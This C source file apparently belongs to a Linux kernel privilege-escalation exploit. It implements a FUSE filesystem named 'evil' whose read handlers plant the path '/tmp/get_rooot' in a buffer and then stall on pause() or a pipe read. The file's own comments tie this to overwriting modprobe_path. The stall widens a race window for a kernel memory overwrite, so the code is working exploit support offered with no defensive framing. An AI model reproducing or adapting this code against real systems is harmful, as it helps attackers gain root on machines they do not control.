#include "fuse_evil.h"

const char *evil_path = "evil";
char *evil_str = "/tmp/get_rooot\x00";

int fuse_pipes[2];
// https://www.maastaar.net/fuse/linux/filesystem/c/2016/05/21/writing-a-simple-filesystem-using-fuse/

int evil_read_pause(const char *path, char *buf, size_t size, off_t offset,
              struct fuse_file_info *fi)
{
    // change to modprobe_path
    char signal;
    size_t len = 0x10000;

    if (offset + size > len)
        size = len - offset;

    memset(evil_buffer + offset, 0x43, size);
    char *evil = evil_str;
    memcpy((void *)(evil_buffer + 0x1000-0x30), evil, strlen(evil));

    if (offset >= len)
        return size;

    memcpy(buf, evil_buffer + offset, size);
    pause();
    return size;
}

int evil_read_sleep(const char *path, char *buf, size_t size, off_t offset,
              struct fuse_file_info *fi)
{
    // change to modprobe_path
    char signal;
    size_t len = 0x10000;

    if (offset + size > len)
        size = len - offset;

    memset(evil_buffer + offset, 0x43, size);
    char *evil = evil_str;
    memcpy((void *)(evil_buffer + 0x1000-0x30), evil, strlen(evil));

    if (offset >= len)
        return size;

    memcpy(buf, evil_buffer + offset, size);
    read(fuse_pipes[0], &signal, 1);
    return size;
}

int evil_getattr(const char *path, struct stat *stbuf,
             struct fuse_file_info *fi)
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0)
    {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    }
    else if (strcmp(path + 1, evil_path) == 0)
    {
        stbuf->st_mode = S_IFREG | 0444;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
    }
    else
    {
        res = -ENOENT;
    }

    return res;
}


int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
             off_t offset, struct fuse_file_info *fi,
             enum fuse_readdir_flags flags)
{
    if (strcmp(path, "/") != 0)
        return -ENOENT;

    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);
    filler(buf, evil_path, NULL, 0, 0);

    return 0;
}